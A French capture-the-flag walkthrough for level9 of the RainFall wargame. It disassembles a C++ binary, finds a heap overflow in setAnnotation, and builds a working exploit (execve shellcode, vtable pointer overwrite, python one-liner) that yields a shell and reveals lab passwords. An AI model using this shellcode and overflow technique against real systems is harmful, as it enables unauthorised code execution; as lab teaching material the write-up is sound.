## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level7
  $ ssh level9@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  level9@127.0.0.1's password c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
  [...]
  level9@RainFall:~$
  
  # On regarde ce qu'on a
  level9@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
    -rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
    -rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile

  # On teste les arguments
  level9@RainFall:~$ ./level9
  level9@RainFall:~$ ./level9 asdfghjklfasdfsdfhgghdgjhgdfsdghgdfsagdhfgaerdgf
  level9@RainFall:~$ ./level9 asdfghjklfasdfsdfhgghdgjhgdfsdghgdfsagdhfgaerdgfasdfasdfasdfsdfaeewyrthdtrhsfghadfafqergsrtsdfaergqergqethsfdgarggaersgsdf
    Segmentation fault (core dumped)
  ```
  * Quand on lance sans arguments, rien ne se passe.
  * Pareil avec un argument "court"
  * Segfault sur un tres long argument


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level9@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level9@RainFall:/tmp$ gdb ~/level9
      [...]
      Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
      All defined functions:

      Non-debugging symbols:
      0x08048464  _init
      0x080484b0  __cxa_atexit
      0x080484b0  __cxa_atexit@plt
      0x080484c0  __gmon_start__
      0x080484c0  __gmon_start__@plt
      0x080484d0  std::ios_base::Init::Init()
      0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
      0x080484e0  __libc_start_main
      0x080484e0  __libc_start_main@plt
      0x080484f0  _exit
      0x080484f0  _exit@plt
      0x08048500  _ZNSt8ios_base4InitD1Ev
      0x08048500  _ZNSt8ios_base4InitD1Ev@plt
      0x08048510  memcpy
      0x08048510  memcpy@plt
      0x08048520  strlen
      0x08048520  strlen@plt
      0x08048530  operator new(unsigned int)
      0x08048530  _Znwj@plt
      0x08048540  _start
      0x08048570  __do_global_dtors_aux
      0x080485d0  frame_dummy             # On a un frame_dummy, you old bro ;)
      0x080485f4  main                    # On a un main
      0x0804869a  __static_initialization_and_destruction_0(int, int)
      0x080486da  _GLOBAL__sub_I_main
      0x080486f6  N::N(int)               # On a un call d'initialisation de la classe N
      0x080486f6  N::N(int)               # On a un call d'initialisation de la classe N
      0x0804870e  N::setAnnotation(char*) # Une methode de N
      0x0804873a  N::operator+(N&)        # Une surcharge d'opérateur +
      0x0804874e  N::operator-(N&)        # Une surcharge d'opérateur -
      0x08048770  __libc_csu_init
      0x080487e0  __libc_csu_fini
      0x080487e2  __i686.get_pc_thunk.bx
      0x080487f0  __do_global_ctors_aux
      0x0804881c  _fini
  ```
  * Oh! Du c++! T.T

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas mainDump of assembler code for function main:
    # Initialisation, alignement, sauvegarde des registres et allocation de 32 octets
    0x080485f4 <+0>:	    push   ebp
    0x080485f5 <+1>:	    mov    ebp,esp
    0x080485f7 <+3>:	    push   ebx
    0x080485f8 <+4>:	    and    esp,0xfffffff0
    0x080485fb <+7>:	    sub    esp,0x20

    # Si argc < 2 exit(1)
    0x080485fe <+10>:	    cmp    DWORD PTR [ebp+0x8],0x1
    0x08048602 <+14>:	    jg     0x8048610 <main+28>
    0x08048604 <+16>:	    mov    DWORD PTR [esp],0x1
    0x0804860b <+23>:	    call   0x80484f0 <_exit@plt>

    # ebx = new N => Alloue 106 pour une instance de N
    0x08048610 <+28>:	    mov    DWORD PTR [esp],0x6c
    0x08048617 <+35>:	    call   0x8048530 <_Znwj@plt> # Call la fonction new
    0x0804861c <+40>:	    mov    ebx,eax

    # Call le constructeur de N avec la zone alouée et met le retour dans ESP + 28
    # Disons donc que ESP + 28 = number5 = N(5)
    0x0804861e <+42>:	    mov    DWORD PTR [esp+0x4],0x5
    0x08048626 <+50>:	    mov    DWORD PTR [esp],ebx
    0x08048629 <+53>:	    call   0x80486f6 <_ZN1NC2Ei>    # Call N(5)
    0x0804862e <+58>:	    mov    DWORD PTR [esp+0x1c],ebx

    # ESP + 24 = number6 = N(6)
    0x08048632 <+62>:	    mov    DWORD PTR [esp],0x6c
    0x08048639 <+69>:	    call   0x8048530 <_Znwj@plt>
    0x0804863e <+74>:	    mov    ebx,eax
    0x08048640 <+76>:	    mov    DWORD PTR [esp+0x4],0x6
    0x08048648 <+84>:	    mov    DWORD PTR [esp],ebx
    0x0804864b <+87>:	    call   0x80486f6 <_ZN1NC2Ei>
    0x08048650 <+92>:	    mov    DWORD PTR [esp+0x18],ebx

    # Met le pointeur sur number5 a ESP + 20
    0x08048654 <+96>:	    mov    eax,DWORD PTR [esp+0x1c]
    0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax

    # Met le pointeur sur number6 a ESP + 16
    0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax

    # Call number5.setAnnotation(ARGV[1])
    0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048667 <+115>:	add    eax,0x4
    0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
    0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
    0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048674 <+128>:	mov    DWORD PTR [esp],eax
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>

    # Optimisation pour accéder a la surcharge d'opérateur + entre number5 et number6 par déréférencement de ces classes (passe par la virtualtable)
    # Succintement, ce bout d'asm fait edx = number5 + number6
    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
    0x08048690 <+156>:	mov    DWORD PTR [esp],eax
    0x08048693 <+159>:	call   edx

    # Return
    0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]  # ebx = 
    0x08048698 <+164>:	leave
    0x08048699 <+165>:	ret
    End of assembler dump.
  ```

  * Ok le main déclare 2 class N, une avec 5 et l'autre 6.
  * Ensuite il number5.setAnnotation(argv[1])
  * Ensuite il return number5 + number6
  * On regarde les méthodes de la classe N...

  ```shell
    gdb-peda$ pdisas _ZN1NC2Ei        # C'est la fonction constructrice N(int)
      Dump of assembler code for function _ZN1NC2Ei:
      # Initialisation
      0x080486f6 <+0>:	push   ebp
      0x080486f7 <+1>:	mov    ebp,esp

      # On assigne la surcharge d'opérateur+ à la virtualtable
      # C'est une optimisation pour accéder à cette fonction plus rapidement.
      # On s'en fout un peu de ce que ca veut dire, il faut juste savoir qu'on a au début de l'instance une ref sur cette fonction
      0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]    # Prend l'addresse de l'instance (this, premier argument)
      0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848  # Assigne la fonction operator+ dans la première place de l'instance.

      # On met le deuxieme argument, le nombre passé en paramètre, à l'addresse de notre instance + 104 (100 pour l'annotation + 4 pour la ref sur operator+)
      0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
      0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx

      # Return
      0x0804870b <+21>:	pop    ebp
      0x0804870c <+22>:	ret
      End of assembler dump.
  ```

  * On passe a setAnnotation

  ```shell
    gdb-peda$ pdisas _ZN1N13setAnnotationEPc
      Dump of assembler code for function _ZN1N13setAnnotationEPc:
      # Initialisation, allocation de 24 octets
      0x0804870e <+0>:	push   ebp
      0x0804870f <+1>:	mov    ebp,esp
      0x08048711 <+3>:	sub    esp,0x18

      # eax = strlen(str, la string passée en paramètre)
      0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
      0x08048717 <+9>:	mov    DWORD PTR [esp],eax
      0x0804871a <+12>:	call   0x8048520 <strlen@plt>

      # call memcpy(this->annotation, str, strlen(str))
      0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
      0x08048722 <+20>:	add    edx,0x4
      0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
      0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
      0x08048730 <+34>:	mov    DWORD PTR [esp],edx
      0x08048733 <+37>:	call   0x8048510 <memcpy@plt>

      # Return
      0x08048738 <+42>:	leave
      0x08048739 <+43>:	ret
      End of assembler dump.
  ```

  * On passe a la surcharge d'opérateur+

  ```shell
  gdb-peda$ pdisas _ZN1NplERS_
    Dump of assembler code for function _ZN1NplERS_:
    # Initialisation
    0x0804873a <+0>:	push   ebp
    0x0804873b <+1>:	mov    ebp,esp

    # On additionne les number des 2 instances (la courante et le paramètre) et on return le resultat
    0x0804873d <+3>:	mov    eax,DWORD PTR [ebp+0x8]
    0x08048740 <+6>:	mov    edx,DWORD PTR [eax+0x68]
    0x08048743 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048746 <+12>:	mov    eax,DWORD PTR [eax+0x68]
    0x08048749 <+15>:	add    eax,edx
    0x0804874b <+17>:	pop    ebp
    0x0804874c <+18>:	ret
    End of assembler dump.
  ```

  * On passe a la surcharge d'opérateur-

  ```shell
    gdb-peda$ pdisas _ZN1NmiERS_
      Dump of assembler code for function _ZN1NmiERS_:
      # Initialisation
      0x0804874e <+0>:	push   ebp
      0x0804874f <+1>:	mov    ebp,esp

      # Pareil que pour le +, mais avec - youhou on s'en doutait pas
      0x08048751 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
      0x08048754 <+6>:	mov    edx,DWORD PTR [eax+0x68]
      0x08048757 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804875a <+12>:	mov    eax,DWORD PTR [eax+0x68]
      0x0804875d <+15>:	mov    ecx,edx
      0x0804875f <+17>:	sub    ecx,eax
      0x08048761 <+19>:	mov    eax,ecx
      0x08048763 <+21>:	pop    ebp
      0x08048764 <+22>:	ret
      End of assembler dump.
  ```

## 2: Comportement
  * Donc on a un programme qui déclare une class N:
  * class N {
    char annotation[100],
    int number;
    int N(int)
    int operator+(N &)
    int operator-(N &)
    void setAnnotation(char *)
  }
  * Le main, quand a lui prend argv[1] et le copie dans l'annotation d'une des 2 instances de N qu'il déclare

## 3: Exploit

### A: Explication

> On sait qu'on va réécrire sur quelque chose a un moment au vu du strcpy d'un buffer non maîtrisé dans une string de taille 100
> Je propose que l'on fasse du fuzzing (recherche a tâtons) plutôt que du reverse engineering:

```shell
  # On va lancer un pattern qui fait segfault le programme pour voir sur quels registres on réécrit
  gdb-peda$ pattern create 200 pattern9
    Writing pattern of 200 chars to filename "pattern9"

  gdb-peda$ run $(cat pattern9)
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    # On voit que notre pattern a écrasé ces 3 registres.
    EAX: 0x6941414d ('MAAi')
    EBX: 0x804a078 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    ECX: 0x41794141 ('AAyA')
    [...]
    [-------------------------------------code-------------------------------------]
    # Le programme a crash sur le déréférencement de eax.
    # Normal, on a écrit n'importe quoi dedans
      0x8048677 <main+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
      0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
      0x8048680 <main+140>:	mov    eax,DWORD PTR [eax]
    => 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
      0x8048684 <main+144>:	mov    eax,DWORD PTR [esp+0x14]
      0x8048688 <main+148>:	mov    DWORD PTR [esp+0x4],eax
      0x804868c <main+152>:	mov    eax,DWORD PTR [esp+0x10]
      0x8048690 <main+156>:	mov    DWORD PTR [esp],eax
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x08048682 in main ()
  # Regardons nos offsets
  gdb-peda$ pattern search
    Registers contain pattern buffer:
    # On a reecrit sur eax au bout de 108 char. Super! C'est quand on le stock dans edx avant de le call que le programme segfault
    EAX+0 found at offset: 108
    # On a reecrit sur ecx au bout de 196 char.
    ECX+0 found at offset: 196
    [...]
```

* On a donc le contrôle de eax qui va être call (après avoir été copié dans edx)
* On n'a pas d'instructions qui lancent un shell donc on va devoir utiliser un shellcode que l'on va appeler grâce à la surcharge de eax.
* On aura une petite particularité quand à la position du shellcode puisque eax est déréférencé 2 fois pour être mis dans edx.

### B: Creation de l'exploit

* L'input malicieux doit être composé de la manière suivante:
=> 1 addresse du shellcode => 2 shellcode => 3 padding restant => 4 addresse de notre input

* Reprenons le bout de code suivant du main:
``` shell
  0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
  0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
  [...]
  0x08048693 <+159>:	call   edx
```

* Le setAnnotation va manifestement écraser à l'offset 108 l'ESP + 10 
* Eax va ensuite prendre cette valeur (la 4ème), qui sera l'addresse de notre input, donc l'addresse de notre 1
* Ensuite a +140 on déréférence une première fois eax, donc on met l'addresse contenue dans 1 dans eax.
* Il se trouve que cette addresse, c'est notre 2 (input +4), l'addresse du shellcode.
* Ensuite a +142 on déréférence encore l'addresse dans 1, mettant donc notre shellcode dans edx.
* Pour terminer, on call edx, c'est à dire notre shellcode.

> BIEN. Nous avons donc besoin de l'addresse de notre input, un shellcode, et c'est tout. C'est parti.

```shell
  # On met un breakpoint avant que eax ne bouge a ESP + 16, à main + 136
  gdb-peda$ b * main+136
    Breakpoint 1 at 0x8048674

  # On print ensuite eax, qui est l'addresse de notre input à ce moment
  gdb-peda$ b * main+136
    Breakpoint 1 at 0x804867c
  gdb-peda$ r AAAA
    [----------------------------------registers-----------------------------------]
    # BIM on l'a
    EAX: 0x804a00c ("AAAA")
    [...]
    Breakpoint 1, 0x0804867c in main ()

  # Ensuite le shellcode
  gdb-peda$ shellcode generate x86/linux exec
    # x86/linux/exec: 24 bytes
    shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )
```

* Maintenant construisons!

> input addr en little endian: "\x0c\xa0\x04\x08"\
> input + 4 en little endian: "\x10\xa0\x04\x08"\
> shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"\
> nb_char_pattern = 108 - 4 - 24 = 80\

* Ce qui nous donne en la lançant:

```shell
  level9@RainFall:/tmp$ ~/level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
    $ whoami
      bonus0
    $ cat /home/user/bonus0/.pass
      f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
  level9@RainFall:/tmp$ su bonus0
    Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
  bonus0@RainFall:~$
```

> ET VOILA. Pas besoin de reverse le code à chaque fois pour comprendre comment faire une faille. Il suffit de savoir ce que l'on contrôle comme registre et comment l'exploiter.